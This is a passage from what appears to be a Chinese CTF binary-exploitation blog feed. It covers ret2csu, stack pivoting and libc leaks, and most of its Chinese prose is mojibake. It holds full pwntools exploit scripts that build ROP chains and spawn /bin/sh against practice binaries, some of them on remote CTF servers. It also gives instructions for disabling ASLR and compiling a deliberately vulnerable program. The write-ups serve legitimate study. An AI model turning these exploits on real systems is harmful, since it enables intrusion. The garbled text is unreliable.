+ 0x8 + 0x8 - 0x080481D8) / 0x10) * 0x100)r.send(b&#39;\x00&#39; * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) + p32(0) + p32(bss_start + gap + 0x4 * 4) + b&#39;/bin/sh\x00&#39; + b&#39;system\x00\x00&#39; + fake_rel + fake_sym)r.recvuntil(&#39;Give your notebook size : &#39;)r.send(str(0x20000))r.recvuntil(&#39;Give your title size : &#39;)r.send(str(0xf7d22714 - 0xf7d01008 - 16))r.recvuntil(&#39;invalid ! please re-enter :\n&#39;)r.send(str(4))r.recvuntil(&#39;Give your title : &#39;)r.send(b&#39;a&#39;)r.recvuntil(&#39;Give your note : &#39;)r.send(b&#39;aaaa&#39;)r.interactive()</code></pre><p>éš¾éš¾éš¾ å•ƒå•ƒå•ƒ<br>æ˜å¤©åˆæ˜¯æ–°çš„ä¸€å¤©â­<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2023/09/01/ret2csu/"/>
      <url>/2023/09/01/ret2csu/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åˆ©ç”¨x64ä¸‹__libc_csu_initå‡½æ•°ä¸­çš„gadgets.ï¼ˆ64ä½ä¼ å‚æœºåˆ¶å¯¼è‡´ï¼Œä½†æˆ‘ä»¬ä¸ä¼šæ¯æ¬¡éƒ½ç²¾å‡†æ‰¾åˆ°æ¯ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsï¼‰</p><p>æ­¤å‡½æ•°å¯¹libcè¿›è¡Œåˆå§‹åŒ–ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œåˆ™æ­¤å‡½æ•°ä¸€å®šå­˜åœ¨.</p><p><strong>ä»€ä¹ˆæ˜¯gadgetsï¼Ÿ</strong><br>gadgetsæ˜¯ä¸€æ®µå¯¹å¯„å­˜å™¨è¿›è¡Œæ“ä½œçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ¯”å¦‚pop ebpï¼›pop eaxï¼›æ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”ç€ä¸€æ®µåœ°å€å°†è¿™äº›gadgetséƒ¨ç½²åˆ°æ ˆä¸­ï¼Œ__ spæŒ‡é’ˆæŒ‡å‘æŸgadgetæ—¶å‘ç°å¯¹åº”åœ°å€ä¸­æ˜¯ä¸€æ¡æŒ‡ä»¤è€Œä¸æ˜¯ä¸€æ¡æ•°æ®åå°±ä¼šå°†è¯¥åœ°å€å¼¹ç»™ __ ipæŒ‡é’ˆï¼Œ __ipæŒ‡é’ˆä¼šæ‰§è¡Œè¯¥åœ°å€ä¸­å­˜æ”¾çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå®Œæˆå¯¹å¯„å­˜å™¨çš„æ“ä½œ.ï¼ˆæŸä¸€gadget-0x1aå¾—åˆ°ä¸Šä¸€gadgetï¼‰ </p><h3 id="å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰"><a href="#å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰" class="headerlink" title="å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰"></a>å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰</h3><p>æºç </p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123;    char buf[128];    read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123;    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);    vulnerable_function();&#125;</code></pre><p>å…³é—­æ ˆä¿æŠ¤å¹¶è¿›è¡Œç¼–è¯‘</p><pre><code>gcc -g -fno-stack-protector â€”z execstack -o test.c test</code></pre><p>å…³é—­æœ¬æœºéšæœºåŒ–ï¼ˆä½é…ï¼‰</p><pre><code>#echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre><p>checksecçœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png" alt="image-20230728162434881"></p><p>å¯ä»¥çœ‹åˆ°PIEè¿˜æ‰“å¼€ï¼ˆä½†æˆ‘ä»¬å…³é—­äº†æœ¬æœºä¸Šçš„åœ°å€éšæœºåŒ–å¯ä»¥å½“ä½œPIEdisableï¼‰<br>ç›¸å½“äºç”¨</p><pre><code>gcc -fno-stack-protector -no-pie -o level test.c</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729002006111.png" alt="image-20230729002006111"></p><p>Go to IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729152236817.png" alt="image-20230729152236817"></p><p>ä¸‹é¢ä¸ºgadget1ï¼Œä¸Šé¢ä¸ºgadget2.ï¼ˆä¸åŒç‰ˆæœ¬gagget2ä¸åŒï¼Œéœ€è¦ä¿®æ”¹ï¼‰</p><p>èµ·å§‹åœ°å€å¯ä»¥ç”¨0x4006AAï¼Œå› ä¸ºæˆ‘ä»¬å¹¶ä¸éœ€è¦addï¼Œä»popéœ€è¦å¯„å­˜å™¨å¼€å§‹å°±ğŸ†—.ä½†æ˜¯éœ€è¦å ä½ï¼ˆè§£é¢˜æ€è·¯ä¸­è¯¦ç»†è§£é‡Šï¼Œè¯·çœ‹ä»¥ä¸‹åˆ†æï¼‰</p><p><strong>é”™ä½è·å–pop rsiï¼›pop rdi</strong><br>è‹¥åªæ˜¯æƒ³å•çº¯æ§åˆ¶pop rsiå’Œpop rdiå¯„å­˜å™¨ï¼Œå¯ä»¥åˆ©ç”¨ROPgadgetï¼ˆpop r14å’Œpop r15å¯¹åº”å¾—gadgetå­˜åœ¨äºlibc_csu_initä¸­ï¼‰<br>æœºå™¨ç ä¸º<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729004219289.png" alt="image-20230729004219289"></p><p>å…·ä½“searchè¯­æ³•</p><pre><code>ROPgadget --binary level --opcode 5e#æˆ–è€…ROPgadget --binary level | grep &#39;pop rsi&#39;</code></pre><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œsystemï¼ˆâ€˜&#x2F;bin&#x2F;shâ€™ï¼‰ï¼ŒNXä¿æŠ¤å¼€å¯ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²libcå‡½æ•°åœ°å€(é€šè¿‡read&#x2F;writeå‡½æ•°)ï¼Œæ‰¾åˆ°systemå‡½æ•°å†™å…¥â€˜&#x2F;bin&#x2F;shâ€™åˆ°bssæ®µä¸Šï¼Œæœ€åè°ƒç”¨systemå‡½æ•°.</p><p><strong>æ³¨æ„</strong><br>æˆ‘ä»¬é€šå¸¸ä¼šæŠŠrbxçš„å€¼è®¾ç½®æˆ0ï¼Œè€Œrbpè®¾ç½®æˆ1.è¿™æ ·çš„ç›®çš„æ˜¯åœ¨æ‰§è¡Œcall qword ptr [r12+rbx*8]è¿™ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä»…ä»…æŠŠr12çš„å€¼ç»™è®¾ç½®æˆæŒ‡å‘æˆ‘ä»¬æƒ³callåœ°å€çš„åœ°å€å³å¯ï¼Œä»è€Œä¸ç”¨ç®¡rbxã€‚<br>åˆå› ä¸ºè¿™ä¸‰ä¸ªæŒ‡ä»¤add rbx,ï¼›cmp rbx, rbpï¼›jnz short loc_400580ï¼Œjnzæ˜¯ä¸ç›¸ç­‰æ—¶è·³è½¬ï¼Œæˆ‘ä»¬é€šå¸¸å¹¶ä¸æƒ³è·³è½¬åˆ°0x400580è¿™ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ­¤åˆ»æ‰§è¡Œè¿™ä¸‰ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±æ˜¯ä»0x400580è¿™ä¸ªåœ°å€è¿‡æ¥çš„ã€‚å› æ­¤rbxåŠ ä¸€ä¹‹åï¼Œæˆ‘ä»¬è¦è®©å®ƒå’Œrbpç›¸ç­‰ï¼Œå› æ­¤rbpå°±è¦æå‰è¢«è®¾ç½®æˆ1.<br>r12è¦å­˜æ”¾çš„å°±æ˜¯æŒ‡å‘ï¼ˆæˆ‘ä»¬è¦è·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼‰çš„åœ°å€ã€‚è¿™é‡Œæœ‰ä¸ªå¾ˆé‡è¦çš„å°æŠ€å·§ï¼Œå¦‚æœä½ ä¸æƒ³ä½¿ç”¨è¿™ä¸ªcallï¼Œæˆ–è€…è¯´ä½ æƒ³callä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä½ æ‹¿ä¸åˆ°å®ƒçš„gotåœ°å€ï¼Œå› æ­¤æ²¡æ³•ä½¿ç”¨è¿™ä¸ªcallï¼Œé‚£å°±å»callä¸€ä¸ªç©ºå‡½æ•°ï¼ˆ_term_procå‡½æ•°ï¼‰ï¼ˆå¹¶ä¸”è¦æ³¨æ„çš„æ˜¯ï¼Œr12çš„åœ°å€å¡«å†™çš„å¹¶ä¸æ˜¯_term_procçš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼‰ã€‚<br>r13,r14,r15è¿™ä¸‰ä¸ªå€¼åˆ†åˆ«å¯¹åº”äº†rdx,rsi,ediã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œr15æœ€åä¼ ç»™çš„æ˜¯edi,æœ€årdiçš„é«˜å››å­—èŠ‚éƒ½æ˜¯00ï¼Œè€Œä½å››å­—èŠ‚æ‰æ˜¯r15é‡Œçš„å†…å®¹ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³ç”¨ret2csuå»æŠŠrdié‡Œå­˜æ”¾æˆä¸€ä¸ªåœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼‰</p><p><strong>å¡«å……å›¾</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011314600.png" alt="image-20230729011314600"></p><p>æ³¨æ„gadgetæœ«å°¾æœ‰ä¸ªret p64ï¼ˆ8ï¼‰å ä½</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011813031.png" alt="image-20230729011813031"></p><p>ä¸ºä»€ä¹ˆè¦å°†systemå‡½æ•°åœ°å€å†™å…¥bssæ®µ? å› ä¸ºè¿™è¡Œä»£ç call qword ptr [r12+rbx*8]æ˜¯<u>é—´æ¥è·³è½¬</u>ï¼Œä¹Ÿå°±æ˜¯å…ˆå°†r12åœ°å€çš„å€¼å–å‡ºæ¥ï¼Œå†è¿›è¡Œè·³è½¬(æƒ³æƒ³Lazy Binding)ã€‚æœ€åçš„æ•ˆæœå°±æ˜¯ï¼Œä»bss_addrä¸­å–å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†è·³è½¬åˆ°systemå‡½æ•°å¤„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729012308773.png" alt="image-20230729012308773"></p><p>exp</p><pre><code class="python">from pwn import *from LibcSeacher import *#context.log_level = &#39;debug&#39;p = process(&#39;./level&#39;)elf = ELF(&#39;./level&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)write_got = elf.got[&#39;write&#39;]read_got = elf.got[&#39;read&#39;]main_addr = 0x400564bss_addr = 0x601028gadget1 = 0x400606gadget2 = 0x4005F0payload1 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got)payload1 += p64(8) + p64(gadget2) + cyclic(0x38) + p64(main_addr)p.sendlineafter(&#39;/n&#39;, payload1)sleep(1)write_addr = u64(p.recv(8))sys_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])payload2 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_addr)payload2 += p64(16) + p64(gadget2) + cyclic(0x38) + p64(main_addr)p.sendlineafter(&#39;/n&#39;, payload2)sleep(1)p.send(p64(sys_addr))p.send(&quot;/bin/sh/x00&quot;)payload3 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0)payload3 += p64(0) + p64(gadget2) + &#39;/x00&#39; * 0x38 + p64(main_addr)sleep(1)p.sendlineafter(&#39;/n&#39;, payload3)p.interactive()</code></pre><h3 id="å…¶ä»–é¢˜ç›®"><a href="#å…¶ä»–é¢˜ç›®" class="headerlink" title="å…¶ä»–é¢˜ç›®"></a>å…¶ä»–é¢˜ç›®</h3><h4 id="ciscn-2019-es-7ï¼ˆå…¶å®SROPï¼‰"><a href="#ciscn-2019-es-7ï¼ˆå…¶å®SROPï¼‰" class="headerlink" title="ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰"></a>ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰</h4><p>ï¼ˆ1ï¼‰checksec ï¼ˆåå­—å¤ªé•¿å°±ç»™æ”¹æˆaäº†wï¼‰</p><p>â€‹    <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729160314382.png" alt="image-20230729160314382"></p><p>ï¼ˆ2ï¼‰Good woman IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164657543.png" alt="image-20230729164657543"></p><p>  åç§»0x18<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164622920.png" alt="image-20230729164622920"></p><p>æŸ¥çœ‹vulnå‡½æ•°å‘ç°ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼šreadå’Œwrite ä»¥åŠsyscallå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164913572.png" alt="image-20230729164913572"></p><p>åŒæ—¶raxè¢«æ”¹æˆäº†0x3Bï¼Œå¯¹åº”è°ƒç”¨execveå‡½æ•°.</p><p>ä½¿ç”¨ROPgadgetæŸ¥çœ‹å¯åˆ©ç”¨çš„gadget.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729165814524.png" alt="image-20230729165814524"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªèƒ½å•ç‹¬æ§åˆ¶rdiï¼Œä¸èƒ½æ§åˆ¶rsiï¼Œrdxçš„å€¼.é‚£å°±ret2csuï¼ˆå½“ç„¶ä¸“é¢˜åºŸè¯hhï¼‰æ§åˆ¶rdxå’Œrsiå‚æ•°ï¼Œæœ€åæ‰§è¡Œmov raxï¼Œ0x3bï¼› syscallå³å¯.</p><p>so éš¾ç‚¹æ¥äº†ï¼šæ€ä¹ˆæŠŠå‚æ•°åœ°å€å­˜å…¥rdiï¼Ÿ<br>ç”±äºæˆ‘ä»¬æ§åˆ¶ä¸äº†raxçš„å€¼ï¼Œæ— æ³•ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å°†å…¶è®¾ç½®ä¸º0.bssæ®µå†™ä¸äº†ï¼Œåªèƒ½å†™å…¥ç¨‹åºç»™æˆ‘ä»¬çš„ç‰¹å®šä½ç½®æ¥äº†ï¼Œæ„å‘³ç€æˆ‘ä»¬éœ€è¦æ³„éœ²æ ˆä¸Šçš„åœ°å€.çœ‹çœ‹ç¨‹åºæ˜¯å¦ä¸ºæˆ‘ä»¬æä¾›äº†å¯ä»¥åˆ©ç”¨çš„ä»£ç .</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171034681.png" alt="image-20230729171034681"></p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º0x30</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171514964.png" alt="image-20230729171514964"></p><p>bufè·ç¦»æ ˆé¡¶åªæœ‰10å­—èŠ‚è·ç¦»ï¼Œå› æ­¤writeå‡½æ•°å¯ä»¥æ‰“å°å‡ºæ ˆä¸­å†…å®¹.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172115885.png" alt="image-20230729172115885"></p><p>æµ‹è¯•åªèƒ½æ˜¾ç¤º48å­—èŠ‚ gdbè°ƒå¼0x30åˆšåˆšå¥½ï¼ˆå…·ä½“ä¹‹åè¡¥å……ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172330284.png" alt="image-20230729172330284"></p><p>å…ˆå‘é€1ç„¶ågdbæŸ¥çœ‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729224838828.png" alt="image-20230729224838828"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729231040910.png" alt="image-20230729231040910"></p><p>æ³„éœ²çš„å†…å®¹æ˜¯çº¢çº¿çš„éƒ¨åˆ†ï¼ˆå½“ç„¶ç”±äºåªèƒ½æ³„éœ²0x30ä¸ªå­—èŠ‚ï¼Œæˆ‘çº¢çº¿åœˆå¤šäº†ï¼Œä½†æ˜¯æˆ‘æƒ³å¼ºè°ƒçš„æ˜¯æ ˆåœ°å€æ³„éœ²ï¼Œæ³„éœ²çš„æ˜¯å†…å®¹ï¼Œè€Œéæ ˆçš„åœ°å€ï¼‰</p><p>ä¸è¿‡æˆ‘ä»¬å‘ç°äº†ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ³„éœ²çš„æ ˆä¸­çš„å†…å®¹æ˜¯æŒ‡å‘äº†æ ˆçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨æ³„éœ²çš„æ ˆçš„å†…å®¹é…åˆåç§»ï¼Œæ¥è·å–æ ˆçš„åœ°å€äº†.</p><p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œvulå‡½æ•°çš„è¿”å›åœ°å€å°±æ˜¯æ­¤æ—¶æ ˆé¡¶çš„ï¼Œæˆ‘ä»¬æ˜¯è¦åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµï¼Œå› æ­¤ç¬¬ä¸€ä¸ªåœ°å€è‚¯å®šæ˜¯æ²¡æ³•æ³„éœ²äº†ï¼Œæˆ‘ä»¬æ¥æ³„éœ²ç¬¬ä¸‰ä¸ªæ ˆçš„å†…å®¹ã€‚ç„¶åæŠŠè¿”å›åœ°å€å¡«å†™æˆvulå‡½æ•°çš„é¦–åœ°å€ï¼Œè®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡ï¼ˆå»è¿›è¡Œret2csuï¼‰</p><p>æ‹¿åˆ°æ ˆä¸­ç¬¬ä¸‰ä¸ªå†…å®¹åï¼Œçœ‹ä¸€ä¸‹å®ƒè·ç¦»æˆ‘ä»¬è¾“å…¥çš„å†…å®¹çš„é¦–åœ°å€åç§»æ˜¯å¤šå°‘.<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171939424-200600591.png" alt="img"></p><p>expï¼š</p><pre><code class="python">from pwn import *from LibcSearcher import *context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)p = remote(&#39;node4.buuoj.cn&#39;, 26250)#p = process(&#39;./a&#39;)e = ELF(&#39;./a&#39;)csu_gadget1 = 0x40059Amodify_rax = 0x4004E2csu_gadget2 = 0x400580term_proc = 0x600e50#pwndbg&gt;search -p åœ°å€ æŸ¥æ‰¾bss_addr = 0x601030pop_rdi_addr = 0x4005a3syscall_addr = 0x400517read_syscall = 0x4004EDoffset = 16payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;\x00&#39;).encode() + p64(read_syscall)p.send(payload)p.recvuntil(b&#39;\x05\x40\x00\x00\x00\x00\x00&#39;)leak_addr = u64(p.recv(8))print(hex(leak_addr))bin_sh_addr = leak_addr - 280print(hex(bin_sh_addr))payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;\x00&#39;).encode() + p64(csu_gadget1)payload += p64(0) + p64(1)payload += p64(term_proc)payload += p64(0) + p64(0) + p64(0)payload += p64(csu_gadget2)payload += b&#39;a&#39; * 56payload += p64(modify_rax)payload += p64(pop_rdi_addr) + p64(bin_sh_addr)payload += p64(syscall_addr)p.send(payload)p.interactive()</code></pre><h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>å…¶å®å¯ä»¥ç›´æ¥ret2libcï¼ˆğŸ¤¡ï¼‰w å­¦ä¹ è®°å½•äº†</p><pre><code class="python">from pwn import *from LibcSearcher import *r=remote(&#39;node4.buuoj.cn&#39;,25408)bank=0x0601080leave=0x400699puts_plt=0x04004E0puts_got=0x0601018pop_rdi=0x400703main=0x0400626ret=0x4004c9r.recvuntil(&#39;u want&#39;)payload=b&#39;a&#39;*0x60+p64(bank)+p64(leave)r.send(payload)r.recvuntil(&#39;now!&#39;)payload=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)r.send(payload)r.recvline()puts_addr=u64(r.recv(6).ljust(8,b&#39;\x00&#39;))print(hex(puts_addr))libc=LibcSearcher(&#39;puts&#39;,puts_addr)libc_base=puts_addr-libc.dump(&#39;puts&#39;)one_gadget=libc_base+0x4526a#system=libc_base+libc.dump(&#39;system&#39;)#binsh=libc_base+libc.dump(&#39;str_bin_sh&#39;)#payload=b&#39;a&#39;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)payload=b&#39;a&#39;*(0x60+8)+p64(one_gadget)r.send(payload)r.interactive()</code></pre><p><strong>æ€è·¯ï¼š</strong>åˆ©ç”¨putså‡½æ•°æ³„éœ²libcå¾—åˆ° åœ¨bssæ®µä¸Šå†™å…¥åˆ©ç”¨ropå†™å…¥shellcode</p><p><strong>é—®é¢˜ï¼š</strong>bufåªæœ‰0x10å¤§å°ï¼Œå¦‚ä½•åœ¨bssæ®µé¡ºåˆ©å†™å…¥å‘¢ï¼Ÿ<br><strong>Answerï¼š</strong>bufåªèƒ½è¦†ç›–åˆ°retï¼Œä½†bankï¼ˆï¼‰åœ¨bssæ®µ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005633820.png"></p><p>åœ¨bufå¤„åˆ©ç”¨leaveæŒ‡ä»¤åŠ«æŒæ ˆè·³è½¬åˆ°bankå¤„ï¼Œå†™å…¥shellcode</p><p>ï¼ˆ1ï¼‰checksec</p><p>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731004821556.png" alt="image-20230731004821556"></p><p>ï¼ˆ2ï¼‰Lovely Woman  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005122883.png" alt="image-20230731005122883"></p><p>NXä¿æŠ¤æ‰“å¼€ï¼Œæ ˆä¸Šæ— systemï¼ˆï¼‰å’Œâ€&#x2F;bin&#x2F;shâ€ -&gt;libcæ³„éœ²</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005742112.png" alt="image-20230731005742112"></p><p>exp</p><pre><code class="python">from pwn import *p=process(&#39;./stack&#39;)context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)e=ELF(&#39;./stack&#39;)libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)puts_plt_addr=e.plt[&#39;puts&#39;]puts_got_addr=e.got[&#39;puts&#39;]read_plt_addr=e.got[&#39;read&#39;]#why got here #callå‡½æ•°ä¸ºè·³è½¬åˆ°æŸåœ°å€å†…æ‰€ä¿å­˜çš„åœ°å€ï¼Œåº”è¯¥ä½¿ç”¨gotè¡¨ä¸­çš„åœ°å€pop_rdi_addr=0x400703level_addr=0x400699bss_addr=0x601080#bank_addrret_csu_addr=0x4006FArsi_addr=0x601118payload1=b&#39;a&#39;*0x60+p64(bss_addr+0x40)+p64(level_addr)#è¿™é‡Œå¤šåŠ 0x40çš„ç›®çš„å°±æ˜¯ä¸ºäº†æ‰§è¡Œputsçš„æ—¶å€™ï¼Œä¸å½±å“ä¹‹å‰çš„gotè¡¨ä¸­çš„æ•°æ®p.sendafter(&#39;u want\n&#39;,payload1)payload2=b&#39;a&#39;*0x40+p64(0)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)payload2+=p64(ret_csu_addr)+p64(0)+p64(0)+p64(read_plt_addr)+p64(0x100)payload2+=p64(rsi_addr)+p64(0)+p64(0x4006E0)#why is there an address here#è¿™ä¸€ä¸ª4006E0ä»…ä»…æ˜¯ret2csuæ‰§è¡Œäº†popä¹‹åçš„retçš„è¿”å›çš„åœ°å€ã€‚#è‡³äºæ€ä¹ˆè¿”å›åˆ°one_gadgetä¸Šçš„ï¼Œæ˜¯å› ä¸ºreadçš„è¿”å›åœ°å€è¢«readè‡ªå·±ç»™æ”¹äº†#payload2ä¸­çš„ç¬¬ä¸€ä¸ªp64(0)æ˜¯å»å ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ ˆè¿ç§»æœ¬èº«çš„ç‰¹æ€§ï¼Œè¿ç§»åçš„ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒä¸æ‰§è¡Œp.sendafter(&#39;k now!\n&#39;,payload2)puts_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))libc_base=puts_addr-libc.symbols[&#39;puts&#39;]one_gadget=libc_base+0x4f432p.sendline(p64(one_gadget))#why p64 here #åªè¦æ˜¯å‘é€åœ°å€ å°±è¦ç»è¿‡æ‰“åŒ…ä¹‹åå‘é€p.interactive()</code></pre><p>â—â—â—u1s1â—â—â—<br>ä¸ç®¡ç”¨å“ªä¸ªæ–¹æ³•ï¼Œéƒ½éœ€è¦è€ƒè™‘åˆ©ç”¨å‡½æ•°ï¼ˆbankï¼‰ä¸gotè¡¨é—´è·ç¦».åœ¨æ ˆè¿æ—¶éœ€è¦æŠŠåœ°å€ç›¸å¯¹æŠ¬é«˜äº›ï¼Œé˜²æ­¢ç ´ågotè¡¨.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731155611578.png" alt="image-20230731155611578"></p><p>ä¸‹é™„æ ˆè¿ç§»ç›¸å…³èµ„æ–™ï¼š</p><p>[]: <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">https://www.cnblogs.com/ZIKH26/articles/15817337.html</a></p><p><strong>tipsï¼š</strong>æ²¡æ³•æ³„éœ²libcæ—¶å¯ç”¨one_gadgetï¼Œåˆ©ç”¨åœ¨çº¿ç½‘ç«™</p><p>[]: <a href="https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64">https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64</a></p><p>å°†æ³„éœ²å‡½æ•°ï¼ˆæœ¬é¢˜ä¸ºputs å…¶ä»–å‡½æ•°æ˜¯å¦ç›¸åŒ æœ‰å¾…è€ƒç©¶ï¼‰çš„åä¸‰ä½ï¼Œæ‰¾åˆ°libcç‰ˆæœ¬</p><pre><code>$ one_gadget libcç‰ˆæœ¬</code></pre>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éƒ¨åˆ†PWNé¢˜ç›®è®°å½•</title>
      <link href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwné¢˜ç›®è®°å½•"><a href="#Pwné¢˜ç›®è®°å½•" class="headerlink" title="Pwné¢˜ç›®è®°å½•"></a><strong>Pwné¢˜ç›®è®°å½•</strong></h3><h3 id="ã€NKCTFã€‘"><a href="#ã€NKCTFã€‘" class="headerlink" title="ã€NKCTFã€‘"></a>ã€NKCTFã€‘</h3><p>å¼±å°å¯æ€œæ— åŠ©çš„å”¯ä¸€ã€‚<br>ï¼ˆ1ï¼‰checkesec å‘ç°ä¸º64ä½ åªæœ‰NXä¿æŠ¤<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530231132244.png" alt="image-20230530231132244"></p><p>ï¼ˆ2ï¼‰è¿›IDAåˆ†æ </p><p>  F5æŸ¥çœ‹mainå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234240598.png"></p><p>  æŸ¥çœ‹åç§»ä¸º0x74ï¼ˆbuf[108]+8[ebpå¤§å°]ï¼‰ buf2å¤§å°éšæœº  æ— åé—¨å‡½æ•° æ­¤æ—¶è”æƒ³åˆ°ä½¿ç”¨pwntoolsç”Ÿæˆå¯åˆ©ç”¨çš„shellcode   v6éšæœºæ‰§è¡Œä½†æœªè®¾ç½®éšæœºæ•°ç§å­ã€æ³¨é‡Šæ‰“æ¼äº†ğŸ˜œã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234339502.png" 